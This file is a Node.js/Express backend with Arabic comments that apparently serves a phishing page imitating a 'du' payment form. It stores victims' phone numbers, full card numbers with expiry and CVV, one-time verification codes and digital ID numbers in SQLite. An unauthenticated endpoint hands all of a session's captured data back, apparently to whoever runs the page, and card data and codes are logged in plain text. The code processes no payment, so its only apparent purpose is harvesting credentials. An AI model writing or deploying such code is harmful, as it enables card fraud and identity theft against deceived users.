const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

// تكوين البيئة
dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

// إعداد middleware
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// إعداد قاعدة بيانات SQLite
const dbPath = path.resolve(__dirname, 'du_payment_data.db');
const db = new sqlite3.Database(dbPath);

console.log('تم الاتصال بقاعدة بيانات SQLite');

// إنشاء الجداول إذا لم تكن موجودة
db.serialize(() => {
  // جدول الجلسات
  db.run(`
    CREATE TABLE IF NOT EXISTS sessions (
      session_id TEXT PRIMARY KEY,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // جدول أرقام الهواتف
  db.run(`
    CREATE TABLE IF NOT EXISTS phone_numbers (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT NOT NULL,
      phone_number TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // جدول بيانات البطاقات
  db.run(`
    CREATE TABLE IF NOT EXISTS card_details (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT NOT NULL,
      card_number TEXT NOT NULL,
      expiry_date TEXT NOT NULL,
      cvv TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // جدول رموز التحقق
  db.run(`
    CREATE TABLE IF NOT EXISTS verification_codes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT NOT NULL,
      code TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // جدول أرقام الهوية الرقمية
  db.run(`
    CREATE TABLE IF NOT EXISTS digital_ids (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT NOT NULL,
      digital_id TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  console.log('تم إنشاء جداول قاعدة البيانات بنجاح');
});

// نقطة نهاية لاختبار الاتصال
app.get('/api/health', (req, res) => {
  console.log('تم استلام طلب health');
  res.status(200).json({ status: 'success', message: 'الخادم يعمل بشكل صحيح' });
});

// نقطة نهاية لحفظ رقم الهاتف
app.post('/api/save-phone', (req, res) => {
  const { phone, sessionId } = req.body;
  console.log(`استلام طلب حفظ رقم الهاتف: ${phone}, الجلسة: ${sessionId}`);
  
  if (!phone || !sessionId) {
    return res.status(400).json({ status: 'error', message: 'رقم الهاتف ومعرف الجلسة مطلوبان' });
  }
  
  // التأكد من وجود الجلسة أو إنشائها
  db.get('SELECT * FROM sessions WHERE session_id = ?', [sessionId], (err, row) => {
    if (err) {
      console.error('خطأ في التحقق من الجلسة:', err.message);
      return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء التحقق من الجلسة' });
    }
    
    const createSession = () => {
      db.run('INSERT INTO sessions (session_id) VALUES (?)', [sessionId], function(err) {
        if (err) {
          console.error('خطأ في إنشاء الجلسة:', err.message);
          return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء إنشاء الجلسة' });
        }
        savePhone();
      });
    };
    
    const savePhone = () => {
      db.run('INSERT INTO phone_numbers (session_id, phone_number) VALUES (?, ?)', [sessionId, phone], function(err) {
        if (err) {
          console.error('خطأ في حفظ رقم الهاتف:', err.message);
          return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء حفظ رقم الهاتف' });
        }
        
        console.log(`تم حفظ رقم الهاتف: ${phone} للجلسة: ${sessionId}`);
        res.status(200).json({ status: 'success', message: 'تم حفظ رقم الهاتف بنجاح' });
      });
    };
    
    if (!row) {
      createSession();
    } else {
      savePhone();
    }
  });
});

// نقطة نهاية لحفظ بيانات البطاقة
app.post('/api/save-card', (req, res) => {
  const { cardNumber, expiryDate, cvv, sessionId } = req.body;
  console.log(`استلام طلب حفظ بيانات البطاقة للجلسة: ${sessionId}`);
  
  if (!cardNumber || !expiryDate || !cvv || !sessionId) {
    return res.status(400).json({ status: 'error', message: 'جميع بيانات البطاقة ومعرف الجلسة مطلوبة' });
  }
  
  // التأكد من وجود الجلسة أو إنشائها
  db.get('SELECT * FROM sessions WHERE session_id = ?', [sessionId], (err, row) => {
    if (err) {
      console.error('خطأ في التحقق من الجلسة:', err.message);
      return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء التحقق من الجلسة' });
    }
    
    const createSession = () => {
      db.run('INSERT INTO sessions (session_id) VALUES (?)', [sessionId], function(err) {
        if (err) {
          console.error('خطأ في إنشاء الجلسة:', err.message);
          return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء إنشاء الجلسة' });
        }
        saveCard();
      });
    };
    
    const saveCard = () => {
      db.run(
        'INSERT INTO card_details (session_id, card_number, expiry_date, cvv) VALUES (?, ?, ?, ?)',
        [sessionId, cardNumber, expiryDate, cvv],
        function(err) {
          if (err) {
            console.error('خطأ في حفظ بيانات البطاقة:', err.message);
            return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء حفظ بيانات البطاقة' });
          }
          
          console.log(`تم حفظ بيانات البطاقة للجلسة: ${sessionId}`);
          res.status(200).json({ status: 'success', message: 'تم حفظ بيانات البطاقة بنجاح' });
        }
      );
    };
    
    if (!row) {
      createSession();
    } else {
      saveCard();
    }
  });
});

// نقطة نهاية لحفظ رمز التحقق
app.post('/api/save-verification-code', (req, res) => {
  const { code, sessionId } = req.body;
  console.log(`استلام طلب حفظ رمز التحقق: ${code}, الجلسة: ${sessionId}`);
  
  if (!code || !sessionId) {
    return res.status(400).json({ status: 'error', message: 'رمز التحقق ومعرف الجلسة مطلوبان' });
  }
  
  // التأكد من وجود الجلسة أو إنشائها
  db.get('SELECT * FROM sessions WHERE session_id = ?', [sessionId], (err, row) => {
    if (err) {
      console.error('خطأ في التحقق من الجلسة:', err.message);
      return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء التحقق من الجلسة' });
    }
    
    const createSession = () => {
      db.run('INSERT INTO sessions (session_id) VALUES (?)', [sessionId], function(err) {
        if (err) {
          console.error('خطأ في إنشاء الجلسة:', err.message);
          return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء إنشاء الجلسة' });
        }
        saveCode();
      });
    };
    
    const saveCode = () => {
      db.run(
        'INSERT INTO verification_codes (session_id, code) VALUES (?, ?)',
        [sessionId, code],
        function(err) {
          if (err) {
            console.error('خطأ في حفظ رمز التحقق:', err.message);
            return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء حفظ رمز التحقق' });
          }
          
          console.log(`تم حفظ رمز التحقق: ${code} للجلسة: ${sessionId}`);
          res.status(200).json({ status: 'success', message: 'تم حفظ رمز التحقق بنجاح' });
        }
      );
    };
    
    if (!row) {
      createSession();
    } else {
      saveCode();
    }
  });
});

// نقطة نهاية لحفظ رقم الهوية الرقمية
app.post('/api/save-digital-id', (req, res) => {
  const { digitalId, sessionId } = req.body;
  console.log(`استلام طلب حفظ رقم الهوية الرقمية: ${digitalId}, الجلسة: ${sessionId}`);
  
  if (!digitalId || !sessionId) {
    return res.status(400).json({ status: 'error', message: 'رقم الهوية الرقمية ومعرف الجلسة مطلوبان' });
  }
  
  // التأكد من وجود الجلسة أو إنشائها
  db.get('SELECT * FROM sessions WHERE session_id = ?', [sessionId], (err, row) => {
    if (err) {
      console.error('خطأ في التحقق من الجلسة:', err.message);
      return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء التحقق من الجلسة' });
    }
    
    const createSession = () => {
      db.run('INSERT INTO sessions (session_id) VALUES (?)', [sessionId], function(err) {
        if (err) {
          console.error('خطأ في إنشاء الجلسة:', err.message);
          return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء إنشاء الجلسة' });
        }
        saveDigitalId();
      });
    };
    
    const saveDigitalId = () => {
      db.run(
        'INSERT INTO digital_ids (session_id, digital_id) VALUES (?, ?)',
        [sessionId, digitalId],
        function(err) {
          if (err) {
            console.error('خطأ في حفظ رقم الهوية الرقمية:', err.message);
            return res.status(500).json({ status: 'error', message: 'حدث خطأ أثناء حفظ رقم الهوية الرقمية' });
          }
          
          console.log(`تم حفظ رقم الهوية الرقمية: ${digitalId} للجلسة: ${sessionId}`);
          res.status(200).json({ status: 'success', message: 'تم حفظ رقم الهوية الرقمية بنجاح' });
        }
      );
    };
    
    if (!row) {
      createSession();
    } else {
      saveDigitalId();
    }
  });
});

// نقطة نهاية لاسترجاع جميع بيانات الجلسة
app.get('/api/get-session-data/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  console.log(`استلام طلب استرجاع بيانات الجلسة: ${sessionId}`);
  
  if (!sessionId) {
    return res.status(400).json({ status: 'error', message: 'معرف الجلسة مطلوب' });
  }
  
  // استرجاع بيانات الجلسة من قاعدة البيانات
  const sessionData = {
    phone: '',
    card: {},
    verificationCode: '',
    digitalId: ''
  };
  
  // استرجاع رقم الهاتف
  db.get(
    'SELECT phone_number FROM phone_numbers WHERE session_id = ? ORDER BY created_at DESC LIMIT 1',
    [sessionId],
    (err, row) => {
      if (err) {
        console.error('خطأ في استرجاع رقم الهاتف:', err.message);
      } else if (row) {
        sessionData.phone = row.phone_number;
      }
      
      // استرجاع بيانات البطاقة
      db.get(
        'SELECT card_number, expiry_date, cvv FROM card_details WHERE session_id = ? ORDER BY created_at DESC LIMIT 1',
        [sessionId],
        (err, row) => {
          if (err) {
            console.error('خطأ في استرجاع بيانات البطاقة:', err.message);
          } else if (row) {
            sessionData.card = {
              number: row.card_number,
              expiry: row.expiry_date,
              cvv: row.cvv
            };
          }
          
          // استرجاع رمز التحقق
          db.get(
            'SELECT code FROM verification_codes WHERE session_id = ? ORDER BY created_at DESC LIMIT 1',
            [sessionId],
            (err, row) => {
              if (err) {
                console.error('خطأ في استرجاع رمز التحقق:', err.message);
              } else if (row) {
                sessionData.verificationCode = row.code;
              }
              
              // استرجاع رقم الهوية الرقمية
              db.get(
                'SELECT digital_id FROM digital_ids WHERE session_id = ? ORDER BY created_at DESC LIMIT 1',
                [sessionId],
                (err, row) => {
                  if (err) {
                    console.error('خطأ في استرجاع رقم الهوية الرقمية:', err.message);
                  } else if (row) {
                    sessionData.digitalId = row.digital_id;
                  }
                  
                  // إرسال جميع البيانات المسترجعة
                  console.log('إرسال بيانات الجلسة:', JSON.stringify(sessionData));
                  res.status(200).json({
                    status: 'success',
                    data: sessionData
                  });
                }
              );
            }
          );
        }
      );
    }
  );
});

// تشغيل الخادم
app.listen(PORT, '0.0.0.0', () => {
  console.log(`الخادم يعمل على المنفذ ${PORT}`);
});
